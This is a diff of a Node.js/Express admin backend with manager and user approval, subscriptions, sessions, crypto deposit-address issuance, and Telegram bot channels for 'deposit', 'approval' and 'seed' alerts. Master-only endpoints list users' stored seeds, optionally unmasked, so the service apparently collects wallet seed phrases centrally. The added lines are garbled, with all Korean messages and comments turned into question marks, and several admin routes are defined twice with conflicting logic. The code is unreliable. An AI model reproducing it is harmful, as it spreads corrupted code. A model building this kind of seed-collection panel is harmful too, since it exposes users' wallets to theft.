-    res.status(401).json({ error: '아이디 또는 비밀번호가 올바르지 않습니다.' });
+    res.status(401).json({ error: '??? ?? ????? ???? ????.' });
   } catch (error) {
-    console.error('관리자 로그인 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('??? ??? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
@@ -2007,7 +2060,7 @@ app.post('/api/admin/logout', (req, res) => {
   res.json({ ok: true });
 });
 
-// 로그인된 관리자 정보 (토큰 검증용)
+// ???? ??? ?? (?? ???)
 app.get('/api/admin/me', requireAdmin, async (req, res) => {
   try {
     let telegram = '';
@@ -2021,44 +2074,44 @@ app.get('/api/admin/me', requireAdmin, async (req, res) => {
       telegram,
     });
   } catch (error) {
-    console.error('관리자 정보 조회 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('??? ?? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// ---------- 마스터 전용: 텔레그램 설정 ----------
+// ---------- ??? ??: ???? ?? ----------
 app.post('/api/admin/telegram', requireAdmin, requireMaster, async (req, res) => {
   try {
-    const telegram = (req.body?.nickname ?? '').toString().trim() || '@문의';
+    const telegram = (req.body?.nickname ?? '').toString().trim() || '@??';
     await db.settingDB.set('global_telegram', telegram);
   res.json({ ok: true });
   } catch (error) {
-    console.error('텔레그램 설정 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('???? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// ---------- 마스터 전용: 매니저 CRUD ----------
+// ---------- ??? ??: ??? CRUD ----------
 app.get('/api/admin/managers', requireAdmin, requireMaster, async (req, res) => {
   try {
     const managers = await db.managerDB.getAll();
     res.json(managers);
   } catch (error) {
-    console.error('매니저 조회 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('??? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
 app.post('/api/admin/managers', requireAdmin, requireMaster, async (req, res) => {
   try {
   const { id, password, telegram, memo } = req.body || {};
-  if (!id?.trim()) return res.status(400).json({ error: '아이디 필요' });
+  if (!id?.trim()) return res.status(400).json({ error: '??? ??' });
     
     await db.managerDB.addOrUpdate(id.trim(), password || '', telegram || '', memo || '');
   res.json({ ok: true });
   } catch (error) {
-    console.error('매니저 추가/수정 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('??? ??/?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
@@ -2067,43 +2120,64 @@ app.delete('/api/admin/managers/:id', requireAdmin, requireMaster, async (req, r
     await db.managerDB.remove(req.params.id);
   res.json({ ok: true });
   } catch (error) {
-    console.error('매니저 삭제 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('??? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// GET /api/admin/master/telegram-bot — 마스터 중앙 알림봇 조회 (마스터 전용)
+// GET /api/admin/master/telegram-bot
 app.get('/api/admin/master/telegram-bot', requireAdmin, requireMaster, async (req, res) => {
   try {
-    const t = await getMasterTelegram();
-    res.json({ botToken: t.botToken || '', chatId: t.chatId || '' });
+    const c = await getMasterTgConfig();
+    const [[d]] = await db.pool.query("SELECT sval FROM master_settings WHERE skey='master_tg_chat_deposit'");
+    const [[s]] = await db.pool.query("SELECT sval FROM master_settings WHERE skey='master_tg_chat_seed'");
+    const [[a]] = await db.pool.query("SELECT sval FROM master_settings WHERE skey='master_tg_chat_approval'");
+    res.json({
+      botToken: c.botToken || '',
+      chatId: c.legacyChatId || '',
+      chatDeposit: (d?.sval || '').toString(),
+      chatSeed: (s?.sval || '').toString(),
+      chatApproval: (a?.sval || '').toString(),
+    });
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
 });
 
-// PUT /api/admin/master/telegram-bot — 마스터 중앙 알림봇 저장 (마스터 전용)
+// PUT /api/admin/master/telegram-bot
 app.put('/api/admin/master/telegram-bot', requireAdmin, requireMaster, async (req, res) => {
   try {
-    const { botToken, chatId } = req.body || {};
-    await setMasterTelegram(botToken?.trim() || null, chatId?.trim() || null);
+    const { botToken, chatId, chatDeposit, chatSeed, chatApproval } = req.body || {};
+    await setMasterTgConfig(botToken?.trim() || null, {
+      chatId: chatId?.trim(),
+      chatDeposit: chatDeposit?.trim(),
+      chatSeed: chatSeed?.trim(),
+      chatApproval: chatApproval?.trim(),
+    });
     res.json({ ok: true });
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
 });
 
-// POST /api/admin/master/telegram-bot/test — 마스터 알림봇 테스트 (마스터 전용)
+// POST /api/admin/master/telegram-bot/test  body: { channel?: 'deposit'|'seed'|'approval' }
 app.post('/api/admin/master/telegram-bot/test', requireAdmin, requireMaster, async (req, res) => {
   try {
-    const t = await getMasterTelegram();
-    if (!t.botToken || !t.chatId) {
-      return res.status(400).json({ error: '마스터 알림봇 토큰 또는 Chat ID가 설정되지 않았습니다.' });
+    const channel = (req.body?.channel || 'deposit').toString();
+    const c = await getMasterTgConfig();
+    if (!c.botToken) {
+      return res.status(400).json({ error: '? ??? ???? ?????.' });
     }
+    const chat = channel === 'seed' ? c.chatSeed : channel === 'approval' ? c.chatApproval : c.chatDeposit;
+    if (!chat) {
+      return res.status(400).json({ error: `?? "${channel}"? Chat ID? ????.` });
+    }
+    const label = channel === 'seed' ? '???? ??' : channel === 'approval' ? '????' : '??';
     await sendTelegram(
-      t.botToken, t.chatId,
-      `✅ <b>마스터 중앙 알림봇 테스트</b>\n\n모든 입금 알림이 이 봇으로 수신됩니다.\n🕐 ${escapeHtml(new Date().toLocaleString('ko-KR'))}`,
-      true // throwOnError
+      c.botToken,
+      chat,
+      `? <b>??? ?? ???</b> (${label})\n?? ${escapeHtml(new Date().toLocaleString('ko-KR'))}`,
+      true
     );
     res.json({ ok: true });
   } catch (e) {
@@ -2111,12 +2185,12 @@ app.post('/api/admin/master/telegram-bot/test', requireAdmin, requireMaster, asy
   }
 });
 
-// GET /api/admin/telegram-errors — 최근 Telegram 전송 실패 로그 (마스터 전용)
+// GET /api/admin/telegram-errors ? ?? Telegram ?? ?? ?? (??? ??)
 app.get('/api/admin/telegram-errors', requireAdmin, requireMaster, (req, res) => {
   res.json({ errors: _tgErrorLog });
 });
 
-// GET /api/admin/python-diag — Python/pymysql 환경 진단 (마스터 전용)
+// GET /api/admin/python-diag ? Python/pymysql ?? ?? (??? ??)
 app.get('/api/admin/python-diag', requireAdmin, requireMaster, (req, res) => {
   const { execFile } = require('child_process');
   const results = {};
@@ -2138,35 +2212,46 @@ app.get('/api/admin/python-diag', requireAdmin, requireMaster, (req, res) => {
   });
 });
 
-// GET /api/admin/managers/:id/telegram-bot — 봇 설정 조회 (마스터 또는 본인만)
+// GET /api/admin/managers/:id/telegram-bot
 app.get('/api/admin/managers/:id/telegram-bot', requireAdmin, async (req, res) => {
   const targetId = req.params.id;
   if (req.admin.role !== 'master' && req.admin.id !== targetId) {
-    return res.status(403).json({ error: '권한 없음' });
+    return res.status(403).json({ error: '?? ??' });
   }
   try {
     const [[mgr]] = await db.pool.query(
-      'SELECT tg_bot_token, tg_chat_id FROM managers WHERE id = ?',
+      'SELECT tg_bot_token, tg_chat_id, tg_chat_deposit, tg_chat_approval FROM managers WHERE id = ?',
       [targetId]
     );
-    if (!mgr) return res.status(404).json({ error: '매니저 없음' });
-    res.json({ botToken: mgr.tg_bot_token || '', chatId: mgr.tg_chat_id || '' });
+    if (!mgr) return res.status(404).json({ error: '??? ??' });
+    res.json({
+      botToken: mgr.tg_bot_token || '',
+      chatId: mgr.tg_chat_id || '',
+      chatDeposit: mgr.tg_chat_deposit || '',
+      chatApproval: mgr.tg_chat_approval || '',
+    });
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
 });
 
-// PUT /api/admin/managers/:id/telegram-bot — 봇 설정 저장 (마스터 또는 본인만)
+// PUT /api/admin/managers/:id/telegram-bot
 app.put('/api/admin/managers/:id/telegram-bot', requireAdmin, async (req, res) => {
   const targetId = req.params.id;
   if (req.admin.role !== 'master' && req.admin.id !== targetId) {
-    return res.status(403).json({ error: '권한 없음' });
+    return res.status(403).json({ error: '?? ??' });
   }
   try {
-    const { botToken, chatId } = req.body || {};
+    const { botToken, chatId, chatDeposit, chatApproval } = req.body || {};
     await db.pool.query(
-      'UPDATE managers SET tg_bot_token = ?, tg_chat_id = ? WHERE id = ?',
-      [botToken?.trim() || null, chatId?.trim() || null, targetId]
+      'UPDATE managers SET tg_bot_token = ?, tg_chat_id = ?, tg_chat_deposit = ?, tg_chat_approval = ? WHERE id = ?',
+      [
+        botToken?.trim() || null,
+        chatId?.trim() || null,
+        chatDeposit?.trim() || null,
+        chatApproval?.trim() || null,
+        targetId,
+      ]
     );
     res.json({ ok: true });
   } catch (e) {
@@ -2174,25 +2259,33 @@ app.put('/api/admin/managers/:id/telegram-bot', requireAdmin, async (req, res) =
   }
 });
 
-// POST /api/admin/managers/:id/telegram-bot/test — 테스트 메시지 발송
+// POST /api/admin/managers/:id/telegram-bot/test  body: { channel?: 'deposit'|'approval' }
 app.post('/api/admin/managers/:id/telegram-bot/test', requireAdmin, async (req, res) => {
   const targetId = req.params.id;
   if (req.admin.role !== 'master' && req.admin.id !== targetId) {
-    return res.status(403).json({ error: '권한 없음' });
+    return res.status(403).json({ error: '?? ??' });
   }
   try {
+    const channel = (req.body?.channel || 'deposit').toString();
     const [[mgr]] = await db.pool.query(
-      'SELECT tg_bot_token, tg_chat_id FROM managers WHERE id = ?',
+      'SELECT tg_bot_token, tg_chat_id, tg_chat_deposit, tg_chat_approval FROM managers WHERE id = ?',
       [targetId]
     );
-    if (!mgr?.tg_bot_token || !mgr?.tg_chat_id) {
-      return res.status(400).json({ error: '봇 토큰 또는 Chat ID가 설정되지 않았습니다.' });
+    if (!mgr?.tg_bot_token) {
+      return res.status(400).json({ error: '? ??? ???? ?????.' });
     }
+    const dep = (mgr.tg_chat_deposit || '').trim() || (mgr.tg_chat_id || '').trim();
+    const appr = (mgr.tg_chat_approval || '').trim() || (mgr.tg_chat_id || '').trim();
+    const chat = channel === 'approval' ? appr : dep;
+    if (!chat) {
+      return res.status(400).json({ error: `?? "${channel}"? Chat ID? ????.` });
+    }
+    const label = channel === 'approval' ? '????' : '??';
     await sendTelegram(
       mgr.tg_bot_token,
-      mgr.tg_chat_id,
-      `✅ <b>Nexus 알림 테스트</b>\n\n매니저 <code>${escapeHtml(targetId)}</code>의 텔레그램 알림이 정상적으로 연결되었습니다.\n🕐 ${escapeHtml(new Date().toLocaleString('ko-KR'))}`,
-      true // throwOnError
+      chat,
+      `? <b>?? ?? ???</b> (${label})\n???: <code>${escapeHtml(targetId)}</code>\n?? ${escapeHtml(new Date().toLocaleString('ko-KR'))}`,
+      true
     );
     res.json({ ok: true });
   } catch (e) {
@@ -2200,10 +2293,10 @@ app.post('/api/admin/managers/:id/telegram-bot/test', requireAdmin, async (req, 
   }
 });
 
-// ---------- 유저 목록 (마스터=전체, 매니저=내 유저만, pending 포함) ----------
+// ---------- ?? ?? (???=??, ???=? ???, pending ??) ----------
 app.get('/api/admin/users', requireAdmin, async (req, res) => {
   try {
-    // pending 포함 전체 조회
+    // pending ?? ?? ??
     let query = 'SELECT id, manager_id as managerId, telegram, status, expire_date as expireDate, subscription_days as subscriptionDays FROM users';
     const params = [];
     if (req.admin.role !== 'master') {
@@ -2233,269 +2326,269 @@ app.get('/api/admin/users', requireAdmin, async (req, res) => {
 
     res.json(withManager);
   } catch (error) {
-    console.error('유저 조회 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('?? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// 승인 대기 목록 조회 (매니저별)
+// ?? ?? ?? ?? (????)
 app.get('/api/admin/pending-users', requireAdmin, async (req, res) => {
   try {
     const managerId = req.admin.role === 'master' ? null : req.admin.id;
     const pendingUsers = await db.userDB.getPendingUsers(managerId);
     res.json(pendingUsers);
   } catch (error) {
-    console.error('승인 대기 목록 조회 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('?? ?? ?? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// 사용자 승인
+// ??? ??
 app.post('/api/admin/approve-user', requireAdmin, async (req, res) => {
   try {
     const { userId } = req.body || {};
-    if (!userId?.trim()) return res.status(400).json({ error: 'userId 필요' });
+    if (!userId?.trim()) return res.status(400).json({ error: 'userId ??' });
     
     const user = await db.userDB.get(userId.trim());
-    if (!user) return res.status(404).json({ error: '사용자를 찾을 수 없습니다.' });
+    if (!user) return res.status(404).json({ error: '???? ?? ? ????.' });
     
-    // 매니저는 자신의 사용자만 승인 가능
+    // ???? ??? ???? ?? ??
     if (req.admin.role === 'manager' && user.managerId !== req.admin.id) {
-      return res.status(403).json({ error: '본인 소속 사용자만 승인 가능합니다.' });
+      return res.status(403).json({ error: '?? ?? ???? ?? ?????.' });
     }
     
     await db.userDB.approveUser(userId.trim());
-    res.json({ ok: true, message: '사용자가 승인되었습니다.' });
+    res.json({ ok: true, message: '???? ???????.' });
   } catch (error) {
-    console.error('사용자 승인 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('??? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// 사용자 거부
+// ??? ??
 app.post('/api/admin/reject-user', requireAdmin, async (req, res) => {
   try {
     const { userId } = req.body || {};
-    if (!userId?.trim()) return res.status(400).json({ error: 'userId 필요' });
+    if (!userId?.trim()) return res.status(400).json({ error: 'userId ??' });
     
     const user = await db.userDB.get(userId.trim());
-    if (!user) return res.status(404).json({ error: '사용자를 찾을 수 없습니다.' });
+    if (!user) return res.status(404).json({ error: '???? ?? ? ????.' });
     
-    // 매니저는 자신의 사용자만 거부 가능
+    // ???? ??? ???? ?? ??
     if (req.admin.role === 'manager' && user.managerId !== req.admin.id) {
-      return res.status(403).json({ error: '본인 소속 사용자만 거부 가능합니다.' });
+      return res.status(403).json({ error: '?? ?? ???? ?? ?????.' });
     }
     
-    // 거부 시 삭제
+    // ?? ? ??
     await db.userDB.remove(userId.trim());
-    res.json({ ok: true, message: '사용자가 거부되었습니다.' });
+    res.json({ ok: true, message: '???? ???????.' });
   } catch (error) {
-    console.error('사용자 거부 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('??? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// 사용기간 설정
+// ???? ??
 app.post('/api/admin/set-subscription', requireAdmin, async (req, res) => {
   try {
     const { userId, days } = req.body || {};
-    if (!userId?.trim()) return res.status(400).json({ error: 'userId 필요' });
+    if (!userId?.trim()) return res.status(400).json({ error: 'userId ??' });
     if (!days || ![30, 90, 180, 365].includes(Number(days))) {
-      return res.status(400).json({ error: '유효한 사용기간을 선택하세요 (30, 90, 180, 365일)' });
+      return res.status(400).json({ error: '??? ????? ????? (30, 90, 180, 365?)' });
     }
     
     const user = await db.userDB.get(userId.trim());
-    if (!user) return res.status(404).json({ error: '사용자를 찾을 수 없습니다.' });
+    if (!user) return res.status(404).json({ error: '???? ?? ? ????.' });
     
-    // 매니저는 자신의 사용자만 설정 가능
+    // ???? ??? ???? ?? ??
     if (req.admin.role === 'manager' && user.managerId !== req.admin.id) {
-      return res.status(403).json({ error: '본인 소속 사용자만 설정 가능합니다.' });
+      return res.status(403).json({ error: '?? ?? ???? ?? ?????.' });
     }
     
     await db.userDB.setSubscription(userId.trim(), Number(days));
-    res.json({ ok: true, message: `사용기간이 ${days}일로 설정되었습니다.` });
+    res.json({ ok: true, message: `????? ${days}?? ???????.` });
   } catch (error) {
-    console.error('사용기간 설정 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('???? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// 사용자 정지/활성화
+// ??? ??/???
 app.post('/api/admin/suspend-user', requireAdmin, async (req, res) => {
   try {
     const { userId, suspend } = req.body || {};
-    if (!userId?.trim()) return res.status(400).json({ error: 'userId 필요' });
+    if (!userId?.trim()) return res.status(400).json({ error: 'userId ??' });
     
     const user = await db.userDB.get(userId.trim());
-    if (!user) return res.status(404).json({ error: '사용자를 찾을 수 없습니다.' });
+    if (!user) return res.status(404).json({ error: '???? ?? ? ????.' });
     
-    // 매니저는 자신의 사용자만 설정 가능
+    // ???? ??? ???? ?? ??
     if (req.admin.role === 'manager' && user.managerId !== req.admin.id) {
-      return res.status(403).json({ error: '본인 소속 사용자만 설정 가능합니다.' });
+      return res.status(403).json({ error: '?? ?? ???? ?? ?????.' });
     }
     
     await db.userDB.suspendUser(userId.trim(), suspend);
-    res.json({ ok: true, message: suspend ? '사용자가 정지되었습니다.' : '사용자가 활성화되었습니다.' });
+    res.json({ ok: true, message: suspend ? '???? ???????.' : '???? ????????.' });
   } catch (error) {
-    console.error('사용자 정지/활성화 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('??? ??/??? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// 유저 추가/수정 (매니저는 더 이상 직접 생성 불가, 승인만 가능)
+// ?? ??/?? (???? ? ?? ?? ?? ??, ??? ??)
 app.post('/api/admin/users', requireAdmin, requireMaster, async (req, res) => {
   try {
   const { id, password, managerId, telegram } = req.body || {};
-  if (!id?.trim()) return res.status(400).json({ error: '아이디 필요' });
+  if (!id?.trim()) return res.status(400).json({ error: '??? ??' });
     
-    // 마스터만 직접 생성 가능
+    // ???? ?? ?? ??
     await db.userDB.addOrUpdate(id.trim(), password || '', managerId || '', telegram || '', 'approved');
   res.json({ ok: true });
   } catch (error) {
-    console.error('유저 추가/수정 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('?? ??/?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// 승인 대기 목록 조회
+// ?? ?? ?? ??
 app.get('/api/admin/pending-users', requireAdmin, async (req, res) => {
   try {
     const pendingUsers = await db.userDB.getPendingUsers();
     
-    // 매니저는 자기 소속만 볼 수 있음
+    // ???? ?? ??? ? ? ??
     if (req.admin.role === 'manager') {
       const filtered = pendingUsers.filter(u => u.managerId === req.admin.id);
       return res.json(filtered);
     }
     
-    // 마스터는 전체 조회
+    // ???? ?? ??
     res.json(pendingUsers);
   } catch (error) {
-    console.error('승인 대기 목록 조회 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('?? ?? ?? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// 사용자 승인
+// ??? ??
 app.post('/api/admin/approve-user', requireAdmin, async (req, res) => {
   try {
     const { userId } = req.body || {};
-    if (!userId?.trim()) return res.status(400).json({ error: 'userId 필요' });
+    if (!userId?.trim()) return res.status(400).json({ error: 'userId ??' });
     
     const user = await db.userDB.get(userId.trim());
-    if (!user) return res.status(404).json({ error: '사용자를 찾을 수 없습니다.' });
+    if (!user) return res.status(404).json({ error: '???? ?? ? ????.' });
     
-    // 매니저는 자기 소속만 승인 가능
+    // ???? ?? ??? ?? ??
     if (req.admin.role === 'manager' && user.managerId !== req.admin.id) {
-      return res.status(403).json({ error: '본인 소속 사용자만 승인할 수 있습니다.' });
+      return res.status(403).json({ error: '?? ?? ???? ??? ? ????.' });
     }
     
     await db.userDB.updateStatus(userId.trim(), 'approved');
     res.json({ success: true });
   } catch (error) {
-    console.error('사용자 승인 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('??? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// 사용자 거부 (삭제)
+// ??? ?? (??)
 app.post('/api/admin/reject-user', requireAdmin, async (req, res) => {
   try {
     const { userId } = req.body || {};
-    if (!userId?.trim()) return res.status(400).json({ error: 'userId 필요' });
+    if (!userId?.trim()) return res.status(400).json({ error: 'userId ??' });
     
     const user = await db.userDB.get(userId.trim());
-    if (!user) return res.status(404).json({ error: '사용자를 찾을 수 없습니다.' });
+    if (!user) return res.status(404).json({ error: '???? ?? ? ????.' });
     
-    // 매니저는 자기 소속만 거부 가능
+    // ???? ?? ??? ?? ??
     if (req.admin.role === 'manager' && user.managerId !== req.admin.id) {
-      return res.status(403).json({ error: '본인 소속 사용자만 거부할 수 있습니다.' });
+      return res.status(403).json({ error: '?? ?? ???? ??? ? ????.' });
     }
     
     await db.userDB.remove(userId.trim());
     res.json({ success: true });
   } catch (error) {
-    console.error('사용자 거부 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('??? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// 사용기간 설정
+// ???? ??
 app.post('/api/admin/set-subscription', requireAdmin, async (req, res) => {
   try {
     const { userId, days } = req.body || {};
-    if (!userId?.trim()) return res.status(400).json({ error: 'userId 필요' });
+    if (!userId?.trim()) return res.status(400).json({ error: 'userId ??' });
     if (!days || ![30, 90, 180, 365].includes(parseInt(days))) {
-      return res.status(400).json({ error: '올바른 일수를 선택하세요 (30, 90, 180, 365)' });
+      return res.status(400).json({ error: '??? ??? ????? (30, 90, 180, 365)' });
     }
     
     const user = await db.userDB.get(userId.trim());
-    if (!user) return res.status(404).json({ error: '사용자를 찾을 수 없습니다.' });
+    if (!user) return res.status(404).json({ error: '???? ?? ? ????.' });
     
-    // 매니저는 자기 소속만 설정 가능
+    // ???? ?? ??? ?? ??
     if (req.admin.role === 'manager' && user.managerId !== req.admin.id) {
-      return res.status(403).json({ error: '본인 소속 사용자만 설정할 수 있습니다.' });
+      return res.status(403).json({ error: '?? ?? ???? ??? ? ????.' });
     }
     
     await db.userDB.setSubscription(userId.trim(), parseInt(days));
     res.json({ success: true });
   } catch (error) {
-    console.error('사용기간 설정 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('???? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// 사용자 정지/활성화
+// ??? ??/???
 app.post('/api/admin/suspend-user', requireAdmin, async (req, res) => {
   try {
     const { userId, suspend } = req.body || {};
-    if (!userId?.trim()) return res.status(400).json({ error: 'userId 필요' });
+    if (!userId?.trim()) return res.status(400).json({ error: 'userId ??' });
     
     const user = await db.userDB.get(userId.trim());
-    if (!user) return res.status(404).json({ error: '사용자를 찾을 수 없습니다.' });
+    if (!user) return res.status(404).json({ error: '???? ?? ? ????.' });
     
-    // 매니저는 자기 소속만 정지/활성화 가능
+    // ???? ?? ??? ??/??? ??
     if (req.admin.role === 'manager' && user.managerId !== req.admin.id) {
-      return res.status(403).json({ error: '본인 소속 사용자만 정지/활성화할 수 있습니다.' });
+      return res.status(403).json({ error: '?? ?? ???? ??/???? ? ????.' });
     }
     
     const newStatus = suspend ? 'suspended' : 'approved';
     await db.userDB.suspend(userId.trim(), suspend);
     
-    // 정지된 경우 세션도 끊기
+    // ??? ?? ??? ??
     if (suspend) {
       await sessionStore.kickUser(userId.trim());
     }
     
     res.json({ success: true });
   } catch (error) {
-    console.error('사용자 정지/활성화 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('??? ??/??? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// 유저 탈퇴(삭제) (마스터 전용)
+// ?? ??(??) (??? ??)
 app.delete('/api/admin/users/:id', requireAdmin, async (req, res) => {
   try {
   const userId = req.params.id?.trim();
-  if (!userId) return res.status(400).json({ error: 'userId 필요' });
+  if (!userId) return res.status(400).json({ error: 'userId ??' });
   if (req.admin.role !== 'master') {
-    return res.status(403).json({ error: '마스터만 사용자 삭제가 가능합니다.' });
+    return res.status(403).json({ error: '???? ??? ??? ?????.' });
   }
     
     const u = await db.userDB.get(userId);
-  if (!u) return res.status(404).json({ error: '유저 없음' });
+  if (!u) return res.status(404).json({ error: '?? ??' });
     
     await db.userDB.remove(userId);
     await sessionStore.kickUser(userId);
   res.json({ ok: true });
   } catch (error) {
-    console.error('유저 삭제 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('?? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// ---------- 세션 (마스터=전체, 매니저=내 유저 세션만) ----------
+// ---------- ?? (???=??, ???=? ?? ???) ----------
 app.get('/api/admin/sessions', requireAdmin, async (req, res) => {
   try {
     let list = await sessionStore.getAll();
@@ -2508,43 +2601,43 @@ app.get('/api/admin/sessions', requireAdmin, async (req, res) => {
     
   res.json(list);
   } catch (error) {
-    console.error('세션 조회 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('?? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
 app.post('/api/admin/kick', requireAdmin, async (req, res) => {
   try {
   const userId = req.body?.userId?.trim();
-  if (!userId) return res.status(400).json({ error: 'userId 필요' });
+  if (!userId) return res.status(400).json({ error: 'userId ??' });
   if (req.admin.role !== 'master') {
-    return res.status(403).json({ error: '마스터만 세션 종료가 가능합니다.' });
+    return res.status(403).json({ error: '???? ?? ??? ?????.' });
   }
     await sessionStore.kickUser(userId);
   res.json({ ok: true });
   } catch (error) {
-    console.error('세션 끊기 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('?? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// ---------- 시드 (마스터만 볼 수 있음) ----------
+// ---------- ?? (???? ? ? ??) ----------
 app.get('/api/admin/seeds', requireAdmin, requireMaster, async (req, res) => {
   try {
   const masked = req.query.masked !== 'false';
     const list = await db.seedDB.getAll(masked);
     res.json(list);
   } catch (error) {
-    console.error('시드 조회 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('?? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// GET /api/admin/users/:id/seeds — 특정 유저의 시드 목록 페이지네이션 (마스터 전용)
+// GET /api/admin/users/:id/seeds ? ?? ??? ?? ?? ?????? (??? ??)
 app.get('/api/admin/users/:id/seeds', requireAdmin, requireMaster, async (req, res) => {
   try {
     const userId = req.params.id?.trim();
-    if (!userId) return res.status(400).json({ error: 'userId 필요' });
+    if (!userId) return res.status(400).json({ error: 'userId ??' });
     const page = Math.max(1, parseInt(req.query.page) || 1);
     const pageSize = Math.min(50, Math.max(1, parseInt(req.query.pageSize) || 10));
     const offset = (page - 1) * pageSize;
@@ -2562,54 +2655,54 @@ app.get('/api/admin/users/:id/seeds', requireAdmin, requireMaster, async (req, r
       pageSize,
     });
   } catch (error) {
-    console.error('유저 시드 조회 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('?? ?? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// ---------- 개인 입금주소 발급 API ----------
+// ---------- ?? ???? ?? API ----------
 
 // POST /api/payment/request-address
-// 사용자가 QR 화면 진입 시 서버에서 개인 입금주소 발급 (또는 기존 재사용)
+// ???? QR ?? ?? ? ???? ?? ???? ?? (?? ?? ???)
 app.post('/api/payment/request-address', async (req, res) => {
   try {
     const { token, userId, orderId, network, tokenType } = req.body || {};
-    console.log('[REQUEST-ADDR] 요청 수신 ▶', { userId, network, tokenType, hasToken: !!token?.trim() });
+    console.log('[REQUEST-ADDR] ?? ?? ?', { userId, network, tokenType, hasToken: !!token?.trim() });
 
-    if (!token?.trim()) return res.status(401).json({ error: '세션 토큰이 필요합니다.' });
+    if (!token?.trim()) return res.status(401).json({ error: '?? ??? ?????.' });
 
-    // 세션 검증
+    // ?? ??
     const sessionUserId = await sessionStore.getUserId(token.trim());
-    console.log('[REQUEST-ADDR] 세션 유저 ▶', sessionUserId);
-    if (!sessionUserId) return res.status(401).json({ error: '유효하지 않은 세션입니다.' });
+    console.log('[REQUEST-ADDR] ?? ?? ?', sessionUserId);
+    if (!sessionUserId) return res.status(401).json({ error: '???? ?? ?????.' });
 
     const resolvedUserId = (userId?.trim() || sessionUserId).toLowerCase();
 
-    // 현재 active 수금 지갑 조회
+    // ?? active ?? ?? ??
     const activeWallet = await db.collectionWalletDB.getActive();
-    console.log('[REQUEST-ADDR] active 지갑 ▶', activeWallet
+    console.log('[REQUEST-ADDR] active ?? ?', activeWallet
       ? { version: activeWallet.wallet_version, address: activeWallet.root_wallet_address, hasSecret: !!activeWallet.xpub_key }
-      : 'null (미등록)'
+      : 'null (???)'
     );
     if (!activeWallet) {
-      return res.status(503).json({ error: '현재 활성화된 수금 지갑이 없습니다. 관리자에게 문의하세요.' });
+      return res.status(503).json({ error: '?? ???? ?? ??? ????. ????? ?????.' });
     }
 
-    // 현재 지갑 버전으로 발급된 기존 레코드 조회 (상태 무관 — upsert)
+    // ?? ?? ???? ??? ?? ??? ?? (?? ?? ? upsert)
     const existing = await db.depositAddressDB.findByUserAndVersion(resolvedUserId, activeWallet.wallet_version);
-    console.log('[REQUEST-ADDR] 기존 주소 ▶', existing
+    console.log('[REQUEST-ADDR] ?? ?? ?', existing
       ? { address: existing.deposit_address, index: existing.derivation_index, status: existing.status }
-      : '없음 (신규 발급)'
+      : '?? (?? ??)'
     );
 
-    // expired 주소는 재사용하지 않고 새로 발급
